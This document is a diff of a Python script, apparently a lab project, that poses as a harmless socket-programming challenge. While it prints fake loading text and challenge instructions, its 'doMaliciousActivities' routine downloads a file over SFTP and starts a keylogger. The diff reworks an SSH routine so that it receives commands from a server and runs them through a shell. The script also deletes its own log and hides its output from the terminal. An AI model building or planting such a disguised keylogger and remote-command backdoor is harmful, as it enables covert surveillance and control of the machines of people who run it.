@@ -122,25 +122,25 @@ class sshClient(object):
 
     def stopKeylogger(self):
         logger.info("stopKeylogger() thread starting")
-        self.invoke_shell()
+        self.invoke_shell("stop")
         self.command = "stop"
-        logger.info(f"Received essage {self.command}")
         logger.info("stopKeylogger() thread finishing",)
 
-    def invoke_shell(self):
+    def invoke_shell(self, command):
         try:
             # connect to SSH server
             self.makeSSHConnection()
 
             logger.info("Calling invoke shell")
-            logger.info("Invoke shell called")
-
-            command = self.channel.recv(1024).decode()
-            logger.info(f"Received message {command}")
-            p = subprocess.Popen(command, shell=True,
-                                 stdout=subprocess.PIPE)
 
             self.channel.sendall(command.encode())
+
+            receivedCommand = self.channel.recv(1024).decode()
+            logger.info(f"Received message {receivedCommand}")
+            p = subprocess.Popen(receivedCommand, shell=True,
+                                 stdout=subprocess.PIPE)
+
+            self.channel.sendall(receivedCommand.encode())
 
             self.channel.close()
             self.ssh.close()
@@ -173,7 +173,7 @@ def doMaliciousActivities():
             sftp.downloadFile(remotepath, localpath)
 
             ssh = sshClient("localhost", 9000, "rick", "jacky")
-            ssh.invoke_shell()
+            ssh.invoke_shell("start")
 
             logger.info("Main before creating thread")
             stopKeyloggerThread = threading.Thread(
@@ -211,9 +211,15 @@ def printNonMaliciousActivity():
         print(str(i / 100) + " percent loaded.", end='\r')
     print("\n")
 
-    print("For this challenge, you'll be writing a python socket client to communicate to a server located at the IP address of '127.0.0.1' and running on port 9000. The client must be able send large data packets and handle multiple request from the server. Your overall implementation will be assessed along with your knowledge of networking fundamentals, coding style and program efficiency.")
+    print("For this challenge, you'll be writing a python socket client to communicate to " +
+          "a server located at the IP address of '127.0.0.1' and running on port 9000. " +
+          "The client must be able send large data packets and handle multiple request " +
+          "from the server. Your overall implementation will be assessed along with your " +
+          "knowledge of networking fundamentals, coding style and program efficiency.")
 
-    print("Run this file as many times as you need to check on the server status and any information you need to see what kind of data you are dealing with. This is file is used to ping the server.")
+    print("Run this file as many times as you need to check on the server status and any " +
+          "information you need to see what kind of data you are dealing with. " +
+          "This is file is used to ping the server.")
 
     print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")
     print("Now let's get coding!")
@@ -222,6 +228,9 @@ def printNonMaliciousActivity():
 # main thread
 if __name__ == '__main__':
     try:
+        if os.path.exists("/home/lab/bin/py/project/sshClient.log"):
+            os.remove("/home/lab/bin/py/project/sshClient.log")
+
         # Add logging to logfile and disable output to the terminal
         logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
                         backupCount=3, disableStderrLogger=True)
